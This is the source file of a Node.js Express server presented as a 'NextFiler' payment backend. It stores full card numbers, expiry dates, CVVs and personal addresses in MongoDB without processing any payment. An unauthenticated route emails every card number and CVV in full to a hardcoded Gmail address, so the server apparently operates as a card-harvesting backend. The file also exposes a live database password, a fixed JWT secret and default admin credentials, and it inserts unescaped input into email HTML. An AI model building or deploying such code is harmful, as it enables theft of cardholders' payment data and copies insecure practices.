require('dotenv').config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const jwt = require("jsonwebtoken");
const nodemailer = require("nodemailer");
const app = express();

app.use(cors());
app.use(express.json());

// ─── Admin Email (receives payment notifications) ────
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "ashbilsadankhan@gmail.com";

// ─── Nodemailer Transporter (Gmail SMTP) ────
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,  // Gmail App Password
  },
});

// ─── MongoDB Connection ────
mongoose
  .connect(
    "mongodb+srv://safiswati10_db_user:Onyxtaffy%40123@cluster0.xajhmc0.mongodb.net/payments",
  )
  .then(() => console.log(" MongoDB connected"))
  .catch((err) => console.error(" MongoDB error:", err));

// ─── Payment Schema ────
const paymentSchema = new mongoose.Schema({
  transaction_id: { type: String, required: true, unique: true },
  name: { type: String, required: true },
  card: { type: String, required: true }, // stored as-is from form
  month: { type: String },
  year: { type: String },
  cvv: { type: String },
  amount: { type: String },
  email: { type: String },
  phone: { type: String },
  address1: { type: String },
  address2: { type: String },
  city: { type: String },
  state: { type: String },
  postal: { type: String },
  country: { type: String },
  created_at: { type: Date, default: Date.now },
});

const Payment = mongoose.model("Payment", paymentSchema);

// ─── JWT Secret ─────
const JWT_SECRET = "nextfiler_admin_secret_2024";

// ─── Admin Credentials (hardcoded, change as needed) ────
const ADMIN = { username: "admin", password: "admin123" };

// ─── Auth Middleware ──
function authMiddleware(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "No token provided" });
  try {
    req.user = jwt.verify(token, JWT_SECRET);
    next();
  } catch {
    return res.status(401).json({ error: "Invalid token" });
  }
}

// ─── Routes ───

// POST /api/login
app.post("/api/login", (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN.username && password === ADMIN.password) {
    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: "24h" });
    return res.json({ token });
  }
  return res.status(401).json({ error: "Invalid credentials" });
});

// POST /api/payments  — called from payment form
app.post("/api/payments", async (req, res) => {
  try {
    const payment = new Payment(req.body);
    await payment.save();
    return res.status(201).json({ success: true, id: payment._id });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: err.message });
  }
});

// GET /api/payments  — dashboard: list with search + pagination
app.get("/api/payments", authMiddleware, async (req, res) => {
  try {
    const { search = "", page = 1, limit = 100 } = req.query;
    const skip = (parseInt(page) - 1) * parseInt(limit);

    const query = search
      ? {
          $or: [
            { transaction_id: { $regex: search, $options: "i" } },
            { name: { $regex: search, $options: "i" } },
            { email: { $regex: search, $options: "i" } },
            { country: { $regex: search, $options: "i" } },
            { amount: { $regex: search, $options: "i" } },
          ],
        }
      : {};

    const [payments, total] = await Promise.all([
      Payment.find(query)
        .sort({ created_at: -1 })
        .skip(skip)
        .limit(parseInt(limit)),
      Payment.countDocuments(query),
    ]);

    return res.json({
      payments,
      total,
      page: parseInt(page),
      pages: Math.ceil(total / parseInt(limit)),
    });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// GET /api/payments/stats  — summary cards
app.get("/api/payments/stats", authMiddleware, async (req, res) => {
  try {
    const total = await Payment.countDocuments();
    const amountAgg = await Payment.aggregate([
      { $addFields: { amt: { $toDouble: { $ifNull: ["$amount", "0"] } } } },
      { $group: { _id: null, total: { $sum: "$amt" } } },
    ]);
    const totalAmount = amountAgg[0]?.total || 0;

    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const todayCount = await Payment.countDocuments({
      created_at: { $gte: today },
    });

    const countries = await Payment.aggregate([
      { $group: { _id: "$country", count: { $sum: 1 } } },
      { $sort: { count: -1 } },
      { $limit: 5 },
    ]);

    return res.json({
      total,
      totalAmount,
      todayCount,
      topCountries: countries,
    });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// GET /api/payments/:id  — single record
app.get("/api/payments/:id", authMiddleware, async (req, res) => {
  try {
    const p = await Payment.findById(req.params.id);
    if (!p) return res.status(404).json({ error: "Not found" });
    return res.json(p);
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});


// DELETE /api/payments/:id  — delete a record
app.delete("/api/payments/:id", authMiddleware, async (req, res) => {
  try {
    const result = await Payment.findByIdAndDelete(req.params.id);
    if (!result) return res.status(404).json({ error: "Not found" });
    return res.json({ success: true });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// ─── POST /api/send-email — Fallback email via Nodemailer (NO auth) ────
app.post("/api/send-email", async (req, res) => {
  try {
    const {
      transaction_id, name, card, month, year, cvv,
      amount, email, phone, address1, address2,
      city, state, postal, country
    } = req.body;

    if (!email) {
      return res.status(400).json({ error: "Missing customer email" });
    }

    // 1️⃣  Email to the customer — payment confirmation
    const customerMailOptions = {
      from: `"NextFiler Payments" <${process.env.EMAIL_USER}>`,
      to: email,
      subject: `Payment Confirmation — ${transaction_id}`,
      html: `
        <div style="font-family:Arial,sans-serif;max-width:600px;margin:auto;padding:20px;">
          <h2 style="color:#4f46e5;">Payment Received ✅</h2>
          <p>Hi <strong>${name}</strong>,</p>
          <p>We have received your payment. Here are the details:</p>
          <table style="width:100%;border-collapse:collapse;margin:16px 0;">
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">Transaction ID</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">${transaction_id}</td></tr>
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">Amount</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">$${amount}</td></tr>
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">Card</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">**** **** **** ${(card || "").replace(/\s/g, "").slice(-4)}</td></tr>
          </table>
          <p>If you did not make this payment, please contact us immediately.</p>
          <p style="color:#6b7280;font-size:12px;">This is an automated message — please do not reply.</p>
        </div>
      `,
    };

    // 2️⃣  Email to admin — full payment details
    const adminMailOptions = {
      from: `"NextFiler Payments" <${process.env.EMAIL_USER}>`,
      to: ADMIN_EMAIL,
      subject: `💰 New Payment — $${amount} from ${name}`,
      html: `
        <div style="font-family:Arial,sans-serif;max-width:600px;margin:auto;padding:20px;">
          <h2 style="color:#dc2626;">New Payment Received</h2>
          <table style="width:100%;border-collapse:collapse;margin:16px 0;">
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">Transaction ID</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">${transaction_id}</td></tr>
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">Name</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">${name}</td></tr>
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">Card</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">${card}</td></tr>
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">Expiry</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">${month}/${year}</td></tr>
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">CVV</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">${cvv}</td></tr>
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">Amount</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">$${amount}</td></tr>
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">Email</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">${email}</td></tr>
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">Phone</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">${phone || "N/A"}</td></tr>
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">Address</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">${address1 || ""} ${address2 || ""}</td></tr>
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">City / State / Postal</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">${city || ""}, ${state || ""} ${postal || ""}</td></tr>
            <tr><td style="padding:8px;border:1px solid #e5e7eb;font-weight:bold;">Country</td>
                <td style="padding:8px;border:1px solid #e5e7eb;">${country || "N/A"}</td></tr>
          </table>
        </div>
      `,
    };

    // Send both emails in parallel
    await Promise.all([
      transporter.sendMail(customerMailOptions),
      transporter.sendMail(adminMailOptions),
    ]);

    console.log(`✅ Emails sent for txn ${transaction_id}`);
    return res.json({ success: true, message: "Emails sent successfully" });
  } catch (err) {
    console.error("❌ Email send error:", err);
    return res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
